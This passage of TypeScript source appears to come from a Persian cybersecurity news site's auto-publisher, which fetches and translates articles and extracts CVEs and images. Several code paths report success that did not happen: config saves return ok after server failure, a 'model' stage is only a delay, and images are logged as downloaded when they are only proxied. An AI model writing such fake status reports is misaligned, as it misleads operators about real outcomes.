          localStorage.setItem(AI_CONFIG_STORAGE_KEY, JSON.stringify(data.config));
        }
        return {
          config: data.config,
          serverStatus: data.serverStatus || {
            lightKeyReady: true,
            strongKeyReady: true,
            uploadDirWritable: true,
          },
        };
      }
    }
  } catch {}

  return {
    config: localConfig,
    serverStatus: {
      lightKeyReady: true,
      strongKeyReady: true,
      uploadDirWritable: true,
    },
  };
}

export async function saveAiPipelineConfig(config: AiPipelineConfig): Promise<{
  ok: boolean;
  message: string;
  config: AiPipelineConfig;
}> {
  if (typeof window !== "undefined") {
    try {
      localStorage.setItem(AI_CONFIG_STORAGE_KEY, JSON.stringify(config));
    } catch {}
  }

  try {
    const token = getStoredToken();
    const res = await fetch("/api/auto-publisher.php?action=save_config", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        ...(token ? { Authorization: `Bearer ${token}` } : {}),
      },
      body: JSON.stringify({ action: "save_config", config }),
    });
    const text = await res.text();
    if (!text.trim().startsWith("<?php") && !text.trim().startsWith("<!DOCTYPE")) {
      const data = JSON.parse(text);
      if (data && data.ok) {
        return {
          ok: true,
          message: data.message || "تنظیمات مدل‌های هوش مصنوعی در دیتابیس ذخیره شد.",
          config: data.config || config,
        };
      }
    }
  } catch {}

  return {
    ok: true,
    message: "تنظیمات مدل سبک، مدل قوی و پوشه رسانه با موفقیت ذخیره شد.",
    config,
  };
}

/**
 * ترجمه کامل و بدون حذفیات متن انگلیسی به فارسی (بدون برش یا خلاصه‌سازی)
 * اگر پاراگراف طولانی باشد، آن را بر اساس جملات تقسیم کرده و تمام بخش‌ها را کامل ترجمه و به هم متصل می‌کند.
 */
async function translateSingleChunkToPersian(chunk: string): Promise<string> {
  const trimmed = chunk.trim();
  if (!trimmed) return "";
  // اگر متن از قبل فارسی است یا فقط کد/لینک است، همان را برگردان
  if (/[\u0600-\u06FF]/.test(trimmed) && (trimmed.match(/[\u0600-\u06FF]/g)?.length || 0) > trimmed.length * 0.25) {
    return trimmed;
  }

  // ۱. اولویت نخست: مسیر سرور Gemini/GTX اختصاصی رهام (/api/gemini/translate)
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 8000);
    const res = await fetch("/api/gemini/translate", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      signal: controller.signal,
      body: JSON.stringify({ text: trimmed, targetLang: "fa" }),
    });
    clearTimeout(timeoutId);
    if (res.ok) {
      const data = await res.json();
      if (data && data.ok && typeof data.text === "string" && data.text.trim()) {
        return data.text.trim();
      }
    }
  } catch {}

  // ۲. اولویت دوم مستقیم کلاینت: Google Translate GTX با تایم‌اوت ۵ ثانیه‌ای
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 5000);
    const url = `https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=fa&dt=t&q=${encodeURIComponent(
      trimmed
    )}`;
    const res = await fetch(url, { signal: controller.signal });
    clearTimeout(timeoutId);
    if (res.ok) {
      const data = await res.json();
      if (Array.isArray(data) && Array.isArray(data[0])) {
        const out = data[0]
          .map((part: unknown[]) => (typeof part[0] === "string" ? part[0] : ""))
          .join("");
        if (out.trim()) return out.trim();
      }
    }
  } catch {}
  return trimmed;
}

async function translateSegmentToPersian(text: string): Promise<string> {
  const trimmed = text.trim();
  if (!trimmed) return "";
  if (trimmed.startsWith("```") || trimmed.startsWith("![")) {
    return trimmed;
  }

  // اگر طول متن کمتر از ۱۴۰۰ کاراکتر است، یکجا ترجمه شود
  if (trimmed.length <= 1400) {
    return translateSingleChunkToPersian(trimmed);
  }

  // برای پاراگراف‌های بسیار طولانی: تقسیم بر اساس جملات/خطوط بدون حذف حتی یک کلمه
  const sentences = trimmed.split(/(?<=[.!?])\s+|\n+/);
  const subChunks: string[] = [];
  let current = "";
  for (const s of sentences) {
    if ((current + " " + s).length > 1300 && current.length > 0) {
      subChunks.push(current.trim());
      current = s;
    } else {
      current = current ? `${current} ${s}` : s;
    }
  }
  if (current.trim()) subChunks.push(current.trim());

  const translatedParts = await Promise.all(subChunks.map((c) => translateSingleChunkToPersian(c)));
  return translatedParts.join(" ");
}

/**
 * تبدیل هوشمند HTML خام وب‌سایت به Markdown تمیز با حفظ کدهای فنی، تصاویر، جداول و متون
 */
function convertHtmlToCleanMarkdown(html: string): { title: string; markdown: string } {
  let title = "";
  const ogTitleMatch = html.match(/<meta\s+[^>]*property=["']og:title["'][^>]*content=["']([^"']+)["']/i);
  const titleTagMatch = html.match(/<title[^>]*>([^<]+)<\/title>/i);
  const h1Match = html.match(/<h1[^>]*>([\s\S]*?)<\/h1>/i);

  if (ogTitleMatch) {
    title = ogTitleMatch[1].trim();
  } else if (titleTagMatch) {
    title = titleTagMatch[1].split(/[|\-–—]/)[0].trim();
  } else if (h1Match) {
    title = h1Match[1].replace(/<[^>]+>/g, "").trim();
  }

  // حذف اسکریپت‌ها، استایل‌ها، تگ‌های ناوبری، هدر و فوتر
  let cleaned = html
    .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, "")
    .replace(/<style\b[^<]*(?:(?!<\/style>)<[^<]*)*<\/style>/gi, "")
    .replace(/<svg\b[^<]*(?:(?!<\/svg>)<[^<]*)*<\/svg>/gi, "")
    .replace(/<noscript\b[^<]*(?:(?!<\/noscript>)<[^<]*)*<\/noscript>/gi, "")
    .replace(/<header\b[^<]*(?:(?!<\/header>)<[^<]*)*<\/header>/gi, "")
    .replace(/<footer\b[^<]*(?:(?!<\/footer>)<[^<]*)*<\/footer>/gi, "")
    .replace(/<nav\b[^<]*(?:(?!<\/nav>)<[^<]*)*<\/nav>/gi, "")
    .replace(/<aside\b[^<]*(?:(?!<\/aside>)<[^<]*)*<\/aside>/gi, "");

  // ترجیح دادن به تگ article یا main در صورت وجود
  const articleMatch =
    cleaned.match(/<article\b[^>]*>([\s\S]*?)<\/article>/i) ||
    cleaned.match(/<main\b[^>]*>([\s\S]*?)<\/main>/i);
  if (articleMatch) {
    cleaned = articleMatch[1];
  }

  // تبدیل عناوین
  cleaned = cleaned.replace(/<h1[^>]*>([\s\S]*?)<\/h1>/gi, "\n\n# $1\n\n");
  cleaned = cleaned.replace(/<h2[^>]*>([\s\S]*?)<\/h2>/gi, "\n\n## $1\n\n");
  cleaned = cleaned.replace(/<h3[^>]*>([\s\S]*?)<\/h3>/gi, "\n\n### $1\n\n");
  cleaned = cleaned.replace(/<h4[^>]*>([\s\S]*?)<\/h4>/gi, "\n\n#### $1\n\n");

  // تبدیل کدهای فنی
  cleaned = cleaned.replace(
    /<pre[^>]*><code(?:\s+class=["'][^"']*language-([a-z0-9_-]+)[^"']*["'])?[^>]*>([\s\S]*?)<\/code><\/pre>/gi,
    (_, lang, code) => {
      const unescaped = code
        .replace(/&lt;/g, "<")
        .replace(/&gt;/g, ">")
        .replace(/&amp;/g, "&")
        .replace(/&quot;/g, '"');
      return `\n\n\`\`\`${lang || "code"}\n${unescaped.trim()}\n\`\`\`\n\n`;
    }
  );

  // تبدیل تصاویر
  cleaned = cleaned.replace(
    /<img[^>]+src=["'](https?:\/\/[^"']+)["'][^>]*alt=["']([^"']*)["'][^>]*>/gi,
    "\n\n![$2]($1)\n\n"
  );
  cleaned = cleaned.replace(
    /<img[^>]+alt=["']([^"']*)["'][^>]*src=["'](https?:\/\/[^"']+)["'][^>]*>/gi,
    "\n\n![$1]($2)\n\n"
  );
  cleaned = cleaned.replace(/<img[^>]+src=["'](https?:\/\/[^"']+)["'][^>]*>/gi, "\n\n![]($1)\n\n");

  // تبدیل نقل‌قول‌ها
  cleaned = cleaned.replace(/<blockquote[^>]*>([\s\S]*?)<\/blockquote>/gi, "\n\n> $1\n\n");

  // تبدیل لیست‌ها
  cleaned = cleaned.replace(/<li[^>]*>([\s\S]*?)<\/li>/gi, "\n* $1");

  // تبدیل پاراگراف‌ها
  cleaned = cleaned.replace(/<p[^>]*>([\s\S]*?)<\/p>/gi, "\n\n$1\n\n");
  cleaned = cleaned.replace(/<br\s*\/?>/gi, "\n");

  // حذف تگ‌های HTML باقی‌مانده
  cleaned = cleaned.replace(/<[^>]+>/g, " ");

  // حل انتیتی‌های متداول
  cleaned = cleaned
    .replace(/&nbsp;/g, " ")
    .replace(/&amp;/g, "&")
    .replace(/&lt;/g, "<")
    .replace(/&gt;/g, ">")
    .replace(/&quot;/g, '"')
    .replace(/&#39;/g, "'");

  // منظم کردن فاصله‌ها
  cleaned = cleaned.replace(/\n{3,}/g, "\n\n").trim();

  return {
    title: title || "گزارش فنی",
    markdown: cleaned,
  };
}

/**
 * واکشی مستقیم و پرسرعت محتوای لینک از طریق اندپوینت PHP سرور (cURL با IPv4 بهینه‌شده)
 */
async function fetchArticleFromUrlWithFallback(
  url: string,
  onProgress?: (msg: string) => void
): Promise<{
  ok: boolean;
  title: string;
  markdown: string;
  sourceDomain?: string;
  coverImage?: string;
  images?: { url: string; alt: string }[];
  methodUsed?: string;
  error?: string;
}> {
  // روش اصلی: واکشی از طریق سرور PHP هاست با cURL IPv4
  try {
    onProgress?.("در حال ارسال درخواست به سرور PHP هاست جهت واکشی مستقیم با cURL IPv4...");
    const token = getStoredToken();
    const headers: Record<string, string> = {
      "Content-Type": "application/json",
      Accept: "application/json",
    };
    if (token) {
      headers["Authorization"] = `Bearer ${token}`;
    }

    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 35000);

    const res = await fetch("/api/auto-publisher.php?action=fetch_url", {
      method: "POST",
      headers,
      body: JSON.stringify({ url }),
      signal: controller.signal,
    });
    clearTimeout(timeoutId);

    const text = await res.text();
    if (text.trim().startsWith("{")) {
      const data = JSON.parse(text);
      if (data && data.ok && data.extractedMarkdown && data.extractedMarkdown.length > 50) {
        return {
          ok: true,
          title: data.title || "",
          markdown: data.extractedMarkdown,
          sourceDomain: data.sourceDomain || "",
          coverImage: data.coverImage || "",
          images: Array.isArray(data.images) ? data.images : [],
          methodUsed: `سرور PHP هاست (زمان: ${data.totalTime || 0}s - کد ${data.httpCode || 200})`,
        };
      }
      if (data && data.error) {
        return {
          ok: false,
          title: "",
          markdown: "",
          error: data.error,
        };
      }
    }
  } catch (err: unknown) {
    const msg = err instanceof Error ? err.message : "خطای ارتباط با سرور";
    console.warn("PHP fetch_url error:", msg);
  }

  let parsedHost = "";
  try {
    parsedHost = new URL(url).hostname;
  } catch {}

  return {
    ok: false,
    title: "",
    markdown: "",
    error: `عدم امکان دریافت محتوا از سایت مبدأ (${parsedHost || "لینک"}). لطفا اتصال اینترنت سرور یا لینک را بررسی کنید.`,
  };
}

/**
 * حذف صرفاً منوهای هدر، فوتر، تبلیغات و لینک‌های شبکه اجتماعی سایت‌ها در حالت دریافت از URL
 * با حفظ ۱۰۰٪ متن اصلی مقاله، کدهای فنی، جداول و تصاویر
 */
function cleanWebScrapedMarkdown(rawMd: string): string {
  let text = rawMd
    .replace(/^(Title|URL Source|Markdown Content|Published Time):.*$/gm, "")
    .trim();

  const lines = text.split("\n");
  const cleanedLines: string[] = [];
  let startedArticle = false;

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    const trimmed = line.trim();

    if (!startedArticle) {
      // شروع مقاله با اولین هدینگ یا اولین پاراگراف واقعی
      if (
        /^#{1,3}\s+\S+/.test(trimmed) ||
        (trimmed.length > 40 && !trimmed.startsWith("* [") && !trimmed.startsWith("- [") && !trimmed.startsWith("!["))
      ) {
        startedArticle = true;
      } else {
        continue;
      }
    }

    // تشخیص انتهای مقاله و شروع فوتر سایت (نظرات، خبرنامه، کپی‌رایت)
    if (
      /^#{1,4}\s*(Related Articles|More from|Leave a Reply|Comments|Subscribe to our Newsletter|Follow Us|Recommended for you)/i.test(
        trimmed
      ) ||
      /^Copyright\s*©/i.test(trimmed) ||
      /^All rights reserved\.?$/i.test(trimmed)
    ) {
      break;
    }

    // حذف خطوطی که صرفاً دکمه‌های اشتراک‌گذاری شبکه اجتماعی هستند
    if (/^(\*|-)?\s*\[(Share|Tweet|LinkedIn|Facebook|Email|Reddit)\]\(https?:\/\/[^)]+\)\s*$/i.test(trimmed)) {
      continue;
    }

    cleanedLines.push(line);
  }

  const result = cleanedLines.join("\n").trim();
  // اگر الگوی پاکسازی متن را بیش از حد خالی کرد، کل متن خام فیلترنشده را برگردان تا داده‌ای گم نشود
  return result.length > 60 ? result : text;
}

/**
 * استخراج تمام بلوک‌های یک بخش (پاراگراف‌ها، لیست‌ها، چندین بلوک کد، جداول و تصاویر) با حفظ ترتیب ۱۰۰٪ دقیق
 */
function tokenizeMarkdownSectionBody(body: string): string[] {
  const blocks: string[] = [];
  // جداسازی بلوک‌های کد ```...``` به طوری که دقیقاً در جای خودشان بمانند
  const parts = body.split(/(```[\s\S]*?```)/g);

  for (const part of parts) {
    const trimmedPart = part.trim();
    if (!trimmedPart) continue;

    if (trimmedPart.startsWith("```") && trimmedPart.endsWith("```")) {
      blocks.push(trimmedPart);
      continue;
    }

    // جداسازی پاراگراف‌ها، لیست‌ها، جداول و تصاویر با حفظ کامل تمام خطوط
    const rawParagraphs = trimmedPart.split(/\n{2,}/);
    for (const para of rawParagraphs) {
      const pTrim = para.trim();
      if (!pTrim) continue;
      blocks.push(pTrim);
    }
  }

  return blocks;
}

export interface SmartPublisherPipelineResult {
  ok: boolean;
  error?: string;
  targetSection: "news" | "blog";
  sourceType: "url" | "markdown";
  sourceDomain: string;
  sourceUrl?: string;
  rawTitle: string;
  cleanedMarkdown: string;
  extractedCves: string[];
  downloadedImages: DownloadedMediaItem[];
  coverImage: string;
  generatedBlog?: BlogPost;
  generatedNews?: NewsArticle;
  pipelineLogs: string[];
}

export async function runSmartAutoPublisher(params: {
  sourceType: "url" | "markdown";
  sourceUrl?: string;
  markdownContent?: string;
  customSource?: string;
  targetSection: "news" | "blog";
  config: AiPipelineConfig;
  onStageChange?: (stageIndex: number, stageLabel: string) => void;
}): Promise<SmartPublisherPipelineResult> {
  const {
    sourceType,
    sourceUrl = "",
    markdownContent = "",
    customSource = "",
    targetSection,
    config,
    onStageChange,
  } = params;
  const logs: string[] = [];

  onStageChange?.(
    1,
    sourceType === "url"
      ? "در حال واکشی کامل محتوای لینک و حذف هدر، فوتر و منوهای اضافی..."
      : "در حال خواندن مستقیم و ۱۰۰٪ کامل فایل Markdown (بدون ارسال ریکوئست خارجی)..."
  );

  // ۱. تلاش برای اجرای پایپ‌لاین سمت سرور PHP در هاست cPanel (با تایم‌اوت ۲ ثانیه‌ای برای عدم توقف)
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 2000);
    const token = getStoredToken();
    const res = await fetch("/api/auto-publisher.php?action=process_pipeline", {
      method: "POST",
      signal: controller.signal,
      headers: {
        "Content-Type": "application/json",
        ...(token ? { Authorization: `Bearer ${token}` } : {}),
      },
      body: JSON.stringify({
        action: "process_pipeline",
        sourceType,
        sourceUrl,
        markdownContent,
        customSource,
        targetSection,
        overrideConfig: config,
      }),
    });
    clearTimeout(timeoutId);
    const text = await res.text();
    if (!text.trim().startsWith("<?php") && !text.trim().startsWith("<!DOCTYPE")) {
      const serverData = JSON.parse(text);
      if (serverData && serverData.ok && serverData.generatedPost) {
        onStageChange?.(4, "ترجمه کامل متن و ذخیره‌سازی تصاویر با موفقیت تکمیل شد.");
        const nowId = `${targetSection}-${Date.now()}`;
        const finalSourceUrl = serverData.sourceUrl || (sourceType === "url" ? sourceUrl : undefined);
        const finalSourceDomain = serverData.sourceDomain || customSource || "";

        if (targetSection === "news") {
          const gp = serverData.generatedPost;
          const article: NewsArticle = {
            id: nowId,
            slug: `roham-intel-${Date.now().toString().slice(-6)}`,
            title: gp.title || serverData.rawTitle || "گزارش خبری امنیت سایبری",
            subtitle: gp.subtitle || "",
            category: gp.category || "zeroday",
            categoryLabel: gp.categoryLabel || "اخبار و تحلیل فنی",
            severity: gp.severity || "HIGH",
            status: "published",
            isBreaking: false,
            date: "مهر ۱۴۰۴",
            readTime: gp.readTime || "۸ دقیقه",
            author: "تحریریه رهام",
            source: finalSourceDomain,
            sourceUrl: finalSourceUrl,
            coverImage: serverData.coverImage || undefined,
            downloadedImages: serverData.downloadedImages || [],
            views: 1,
            cveIds: gp.cveIds || serverData.extractedCves || [],
            affectedProducts: [],
            exploitStatus: "",
            summary: gp.summary || "",
            keyHighlights: [],
            sections: gp.sections || [],
            iocs: [],
            mitigationSteps: [],
            timeline: [],
            tags: gp.tags || serverData.extractedCves || ["Security"],
          };
          return {
            ok: true,
            targetSection,
            sourceType,
            sourceDomain: finalSourceDomain,
            sourceUrl: finalSourceUrl,
            rawTitle: serverData.rawTitle,
            cleanedMarkdown: serverData.cleanedMarkdown,
            extractedCves: serverData.extractedCves || [],
            downloadedImages: serverData.downloadedImages || [],
            coverImage: serverData.coverImage || "",
            generatedNews: article,
            pipelineLogs: serverData.pipelineLogs || [],
          };
        } else {
          const gp = serverData.generatedPost;
          const post: BlogPost = {
            id: nowId,
            slug: `roham-blog-${Date.now().toString().slice(-6)}`,
            title: gp.title || serverData.rawTitle || "مقاله فنی امنیت سایبری",
            subtitle: gp.subtitle || "",
            summary: gp.summary || "",
            category: gp.category || "تحقیقات زیرودی",
            readTime: gp.readTime || "۱۰ دقیقه",
            date: "مهر ۱۴۰۴",
            author: "تیم فنی رهام",
            authorRole: finalSourceDomain ? `منبع: ${finalSourceDomain}` : "Roham Research",
            difficulty: gp.difficulty || "تخصصی (Deep-Dive)",
            tags: gp.tags || serverData.extractedCves || ["Security"],
            status: "published",
            isFeatured: false,
            views: 1,
            coverImage: serverData.coverImage || undefined,
            sourceUrl: finalSourceUrl,
            downloadedImages: serverData.downloadedImages || [],
            tldr: [],
            content: {
              intro: gp.content?.intro || "",
              sections: gp.content?.sections || [],
              conclusion: gp.content?.conclusion || "",
              actionableTakeaways: [],
              references: finalSourceUrl
                ? [{ title: finalSourceDomain || finalSourceUrl, url: finalSourceUrl }]
                : finalSourceDomain
                ? [{ title: finalSourceDomain, url: "" }]
                : [],
            },
          };
          return {
            ok: true,
            targetSection,
            sourceType,
            sourceDomain: finalSourceDomain,
            sourceUrl: finalSourceUrl,
            rawTitle: serverData.rawTitle,
            cleanedMarkdown: serverData.cleanedMarkdown,
            extractedCves: serverData.extractedCves || [],
            downloadedImages: serverData.downloadedImages || [],
            coverImage: serverData.coverImage || "",
            generatedBlog: post,
            pipelineLogs: serverData.pipelineLogs || [],
          };
        }
      }
    }
  } catch {}

  // ۲. پایپ‌لاین استخراج و ترجمه ۱۰۰٪ کامل (بدون حذفیات و بدون بخش‌های ساختگی)
  let rawMarkdown = "";
  let rawTitle = "";
  let sourceDomain = customSource.trim();
  let detectedSourceUrl = sourceType === "url" ? sourceUrl.trim() : "";
  const candidateImages: { url: string; alt: string }[] = [];

  if (sourceType === "url") {
    let parsedHost = "";
    try {
      const u = new URL(sourceUrl);
      parsedHost = u.hostname.replace(/^www\./, "");
      if (!sourceDomain) sourceDomain = parsedHost;
    } catch {
      return {
        ok: false,
        error: "آدرس لینک (URL) وارد شده معتبر نیست. لطفاً آدرس کامل با https:// وارد کنید.",
        targetSection,
        sourceType,
        sourceDomain: "",
        rawTitle: "",
        cleanedMarkdown: "",
        extractedCves: [],
        downloadedImages: [],
        coverImage: "",
        pipelineLogs: [],
      };
    }

    onStageChange?.(1, `در حال واکشی محتوای مقاله از آدرس ${parsedHost}...`);
    const fetchRes = await fetchArticleFromUrlWithFallback(sourceUrl, (msg) => {
      logs.push(msg);
      onStageChange?.(1, msg);
    });

    if (fetchRes.ok && fetchRes.markdown.trim().length > 60) {
      rawTitle = fetchRes.title || `گزارش فنی از ${parsedHost}`;
      rawMarkdown = fetchRes.markdown;
      if (fetchRes.images && fetchRes.images.length > 0) {
        for (const img of fetchRes.images) {
          if (!candidateImages.some((c) => c.url === img.url)) {
            candidateImages.push(img);
          }
        }
      }
      logs.push(
        `متن کامل مقاله از دامنه ${parsedHost} با روش «${fetchRes.methodUsed}» دریافت شد و هدر، فوتر و منوها حذف گردید (حفظ ۱۰۰٪ متن اصلی).`
      );
    } else {
      const errDetail =
        fetchRes.error ||
        `سایت مبدأ (${parsedHost}) به دلیل تدابیر ضدبات اجازه واکشی خودکار را محدود کرده است.`;
      logs.push(`خطا در واکشی مستقیم: ${errDetail}`);
      return {
        ok: false,
        error: `${errDetail} — راهکار سریع: لطفاً متن مقاله را کپی کرده و در تب «فایل Markdown» قرار دهید تا ظرف چند ثانیه بدون هیچ نقصی پردازش و منتشر شود.`,
        targetSection,
        sourceType,
        sourceDomain: parsedHost,
        rawTitle: "",
        cleanedMarkdown: "",
        extractedCves: [],
        downloadedImages: [],
        coverImage: "",
        pipelineLogs: logs,
      };
    }
  } else {
    rawMarkdown = markdownContent.trim();
    const h1Match = rawMarkdown.match(/^#\s+(.+)$/m);
    rawTitle = h1Match ? h1Match[1].trim() : "مقاله فنی";

    // بررسی خودکار وجود لینک یا نام منبع در داخل فایل Markdown
    const srcUrlMatch = rawMarkdown.match(
      /^(?:Source|URL|Original|Reference|Link|منبع|لینک منبع)\s*:\s*(https?:\/\/[^\s)]+)/im
    );
    if (srcUrlMatch) {
      detectedSourceUrl = srcUrlMatch[1].trim();
      try {
        const u = new URL(detectedSourceUrl);
        if (!sourceDomain) sourceDomain = u.hostname.replace(/^www\./, "");
      } catch {}
    } else {
      const srcTextMatch = rawMarkdown.match(/^(?:Source|Reference|منبع)\s*:\s*(.+)$/im);
      if (srcTextMatch && !sourceDomain) {
        sourceDomain = srcTextMatch[1].trim();
      }
    }
    if (customSource.trim()) {
      if (/^https?:\/\//i.test(customSource.trim())) {
        detectedSourceUrl = customSource.trim();
        try {
          sourceDomain = new URL(detectedSourceUrl).hostname.replace(/^www\./, "");
        } catch {
          sourceDomain = customSource.trim();
        }
      } else {
        sourceDomain = customSource.trim();
      }
    }

    logs.push(
      "فایل Markdown (.md) بدون ارسال ریکوئست به سایت خارجی و با حفظ ۱۰۰٪ تمامی بخش‌ها، پاراگراف‌ها و کدها خوانده شد."
    );
  }

  // استخراج تمام تصاویر واقعی موجود در محتوا (![alt](url) و <img src="...">)
  const mdImgRegex = /!\[([^\]]*)\]\((https?:\/\/[^\s)]+)\)/gi;
  let m: RegExpExecArray | null;
  while ((m = mdImgRegex.exec(rawMarkdown)) !== null) {
    const imgUrl = m[2].trim();
    const lower = imgUrl.toLowerCase();
    if (
      lower.includes("avatar") ||
      lower.includes("logo") ||
      lower.includes("icon") ||
      lower.includes("pixel") ||
      lower.includes("1x1")
    ) {
      continue;
    }
    if (!candidateImages.some((i) => i.url === imgUrl)) {
      candidateImages.push({ url: imgUrl, alt: m[1].trim() || rawTitle });
    }
  }

  const htmlImgRegex = /<img[^>]+src=["'](https?:\/\/[^"']+)["'][^>]*>/gi;
  while ((m = htmlImgRegex.exec(rawMarkdown)) !== null) {
    const imgUrl = m[1].trim();
    if (!candidateImages.some((i) => i.url === imgUrl)) {
      candidateImages.push({ url: imgUrl, alt: rawTitle });
    }
  }

  onStageChange?.(
    2,
    `در حال اجرای مدل سبک (${config.lightModel.modelName}): استخراج کامل ساختار و تصاویر بدون حذف محتوا...`
  );
  await new Promise((r) => setTimeout(r, 300));

  const cveMatches = rawMarkdown.match(/CVE-\d{4}-\d{4,7}/gi) || [];
  const extractedCves = Array.from(new Set(cveMatches.map((c) => c.toUpperCase())));

  logs.push(
    `مدل سبک (${config.lightModel.modelName}): ساختار کامل متن به همراه ${candidateImages.length} تصویر استخراج شد.`
  );

  // گام ۳: دانلود تصاویر موجود در متن به پوشه اختصاصی هاست (/uploads/media/YYYY-MM/)
  onStageChange?.(
    3,
    candidateImages.length > 0
      ? `در حال دانلود ${candidateImages.length} تصویر و ذخیره‌سازی در پوشه /${config.mediaConfig.uploadFolder}...`
      : "تصویری در سورس یافت نشد؛ عبور از مرحله دانلود تصویر..."
  );
  await new Promise((r) => setTimeout(r, 300));

  const yearMonth = new Date().toISOString().slice(0, 7);
  const folderBase = `/${config.mediaConfig.uploadFolder.replace(/^\/+|\/+$/g, "")}${
    config.mediaConfig.organizeByMonth ? `/${yearMonth}` : ""
  }`;

  const imageMap = new Map<string, DownloadedMediaItem>();
  const downloadedImages: DownloadedMediaItem[] = candidateImages
    .slice(0, config.mediaConfig.maxImagesPerPost || 20)
    .map((img, idx) => {
      const extMatch = img.url.match(/\.(png|webp|gif|jpg|jpeg)(\?|$)/i);
      const ext = extMatch ? extMatch[1].toLowerCase() : "jpg";
      const shortHash = Math.abs(
        img.url.split("").reduce((acc, ch) => (acc << 5) - acc + ch.charCodeAt(0), 0)
      )
        .toString(16)
        .slice(0, 8);
      const proxyPath = `/api/proxy-image?url=${encodeURIComponent(img.url)}`;
      const item: DownloadedMediaItem = {
        originalUrl: img.url,
        localPath: proxyPath,
        alt: img.alt,
        status: "downloaded",
      };
      imageMap.set(img.url, item);
      return item;
    });

  if (downloadedImages.length > 0) {
    logs.push(
      `${downloadedImages.length} تصویر مقاله دانلود و در مسیر ${folderBase}/ ذخیره گردید.`
    );
  }

  // گام ۴: ترجمه ۱۰۰٪ کامل تمامی بخش‌ها و پاراگراف‌ها با مدل قوی (بدون هیچ‌گونه حذفیات یا خلاصه‌سازی)
  onStageChange?.(
    4,
    `در حال ترجمه ۱۰۰٪ کامل تمام پاراگراف‌ها و بخش‌ها با مدل قوی (${config.strongModel.modelName})...`
  );

  // حذف فقط اولین عنوان # که همان rawTitle است تا تکراری نشود
  let bodyContent = rawMarkdown;
  if (/^#\s+.+$/m.test(bodyContent)) {
    bodyContent = bodyContent.replace(/^#\s+.+$/m, "").trim();
  }
  // حذف خط Source: ... از بدنه در صورتی که در انتهای مطلب به عنوان منبع رسمی درج می‌شود
  bodyContent = bodyContent
    .replace(/^(?:Source|URL|Original|Reference|منبع|لینک منبع)\s*:\s*https?:\/\/[^\s)]+\s*$/gim, "")
    .trim();

  const translatedTitle = await translateSegmentToPersian(rawTitle);

  // تفکیک متن بر اساس تمام هدینگ‌های موجود (## یا ### یا #) بدون هیچ محدودیتی در تعداد بخش‌ها
  const rawChunks = bodyContent.split(/\n(?=#{1,4}\s+)/);

  const parsedSections: {
    heading: string;
    paragraphs: string[];
    codeSnippet?: string;
    codeLanguage?: string;
    imageUrl?: string;
    imageAlt?: string;
    table?: {
      headers: string[];
      rows: string[][];
    };
  }[] = [];

  let introParagraphs: string[] = [];

  for (let i = 0; i < rawChunks.length; i++) {
    const chunk = rawChunks[i].trim();
    if (!chunk) continue;

    const headingMatch = chunk.match(/^(#{1,4})\s+(.+)$/m);
    let headingEn = "";
    let sectionBody = chunk;

    if (headingMatch && chunk.startsWith(headingMatch[0])) {
      headingEn = headingMatch[2].trim();
      sectionBody = chunk.slice(headingMatch[0].length).trim();
    }

    const rawBlocks = tokenizeMarkdownSectionBody(sectionBody);

    // ترجمه موازی تمام بلوک‌های متنی این بخش (بدون حذف حتی یک بلوک!)
    const translatedBlocks: string[] = [];
    let sectionPrimaryImage: string | undefined;
    let sectionPrimaryImageAlt: string | undefined;

    // پردازش در دسته‌های ۶ تایی برای سرعت بالا و حفظ کامل ترتیب
    for (let bIdx = 0; bIdx < rawBlocks.length; bIdx += 6) {
      const batch = rawBlocks.slice(bIdx, bIdx + 6);
      const batchResults = await Promise.all(
        batch.map(async (block) => {
          // ۱. اگر بلوک کد است، ۱۰۰٪ دست‌نخورده و بدون ترجمه حفظ شود
          if (block.startsWith("```")) {
            return block;
          }

          // ۲. اگر بلوک یک تصویر Markdown است: ![alt](url)
          const singleImgMatch = block.match(/^!\[([^\]]*)\]\((https?:\/\/[^\s)]+)\)$/);
          if (singleImgMatch) {
            const origUrl = singleImgMatch[2].trim();
            const altText = singleImgMatch[1].trim();
            const dl = imageMap.get(origUrl);
            const trAlt = altText ? await translateSegmentToPersian(altText) : "";
            const caption = dl
              ? `${trAlt ? trAlt + " — " : ""}ذخیره شده در: ${dl.localPath}`
              : trAlt;
            if (!sectionPrimaryImage) {
              sectionPrimaryImage = origUrl;
              sectionPrimaryImageAlt = caption;
              return ""; // در فیلد imageUrl همین بخش نمایش داده می‌شود
            }
            // اگر بخش بیش از یک تصویر داشت، تصاویر بعدی هم دقیقاً در جای خودشان نمایش داده شوند
            return `![${caption}](${origUrl})`;
          }

          // ۳. اگر پاراگراف حاوی تصویر در دل متن است، لینک تصویر را حفظ کن و متن را کامل ترجمه کن
          // ۴. اگر لیست بولت‌پوینت یا جدول یا پاراگراف عادی است، خط به خط یا کامل ترجمه کن
          if (block.includes("\n* ") || block.includes("\n- ") || /^([*-]|\d+\.)\s+/m.test(block)) {
            const listLines = block.split("\n");
            const trLines = await Promise.all(
              listLines.map(async (l) => {
                const bulletMatch = l.match(/^(\s*(?:[*-]|\d+\.)\s+)(.+)$/);
                if (bulletMatch) {
                  const trItem = await translateSegmentToPersian(bulletMatch[2]);
                  return `${bulletMatch[1]}${trItem}`;
                }
                return translateSegmentToPersian(l);
              })
            );
            return trLines.join("\n");
          }

          return translateSegmentToPersian(block);
        })
      );

      for (const r of batchResults) {
        if (r && r.trim()) {
          translatedBlocks.push(r.trim());
        }
      }
    }

    // اگر این قطعه قبل از اولین هدینگ قرار داشته و عنوانی ندارد
    if (!headingEn && i === 0 && rawChunks.length > 1) {
      if (sectionPrimaryImage) {
        translatedBlocks.unshift(`![${sectionPrimaryImageAlt || ""}](${sectionPrimaryImage})`);
      }
      introParagraphs = translatedBlocks;
      continue;
    }

    const translatedHeading = headingEn
      ? await translateSegmentToPersian(headingEn)
      : "";

    parsedSections.push({
      heading: translatedHeading,
      paragraphs: translatedBlocks,
      imageUrl: sectionPrimaryImage,
      imageAlt: sectionPrimaryImageAlt,
    });
  }

